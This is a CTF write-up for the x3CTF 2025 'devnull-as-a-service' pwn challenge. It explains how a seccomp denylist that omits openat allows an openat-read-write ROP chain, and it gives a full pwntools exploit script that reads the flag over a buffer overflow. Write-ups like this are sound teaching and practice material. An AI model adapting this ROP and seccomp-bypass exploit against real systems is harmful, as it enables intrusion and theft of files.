---
title: devnull-as-a-service
description: |
  A few months ago, I came across this website. Inspired by it, I decided to recreate the service in C to self-host it.
  To avoid any exploitable vulnerabilities, I decided to use a very strict seccomp filter. Even if my code were vulnerable, good luck exploiting it.
  PS: You can find the flag at /home/ctf/flag.txt on the remote server.
categories: ["ctf", "x3CTF 2025"]
tags: ["pwn"]
media_subpath: "/assets/posts/2025/x3ctf/devnull-as-a-service"
---

We have a simple buffer overflow, but protected by seccomp:

![](01.png)

We can use `seccomp-tools` to view the syscalls we are allowed to perform:

![](02.png)

We have a denylist of syscalls. However, some alternatives are not included. For example, we can call `openat` instead
of `open`. `read` and `write` are not blocked, so we can do a `openat`-`read`-`write` chain to get the flag.

The binary is statically linked, so we have plenty of ROP gadgets. 

We still need to read the flag name somewhere. The binary does not have PIE enabled, so we can choose any address in the
data section that does not interfere with the program execution and call `gets` on it. We can then use the address in the
`openat` syscall.

Final exploit code:

```py
from pwn import *

context.arch = "amd64"
context.terminal = ["ghostty", "-e"]

data_cave = 0x4af395

rop = ROP("./dev_null")
elf = ELF("./dev_null")

pop_rdx = 0x47d944

'''
io = gdb.debug("./dev_null", """
    b *dev_null + 52
    c
""")
'''
io = remote("20cbda3f-7e2e-4988-a683-5d14618adb42.x3c.tf", 31337, ssl=True)
io.clean()
io.sendline(flat(
    b"A" * 16,

    # gets(data_cave)
    p64(rop.rdi.address),
    p64(data_cave),
    p64(elf.sym.gets),

    # openat(AT_FDCWD, data_cave, 0) -> 3
    p64(rop.rdi.address), p64(-100 + 2 ** 64),
    p64(rop.rsi.address), p64(data_cave), p64(0),
    p64(pop_rdx), p64(0), p64(0), p64(0),
    p64(elf.sym.openat),

    # read(3, data_cave, 0x100)
    p64(rop.rdi.address), p64(3),
    p64(rop.rsi.address), p64(data_cave), p64(0),
    p64(pop_rdx), p64(0x100), p64(0), p64(0),
    p64(elf.sym.read),

    # write(1, data_cave, 0x100)
    p64(rop.rdi.address), p64(1),
    p64(rop.rsi.address), p64(data_cave), p64(0),
    p64(pop_rdx), p64(0x100), p64(0), p64(0),
    p64(elf.sym.write),
))

io.sendline(b"/home/ctf/flag.txt")

io.interactive()
```
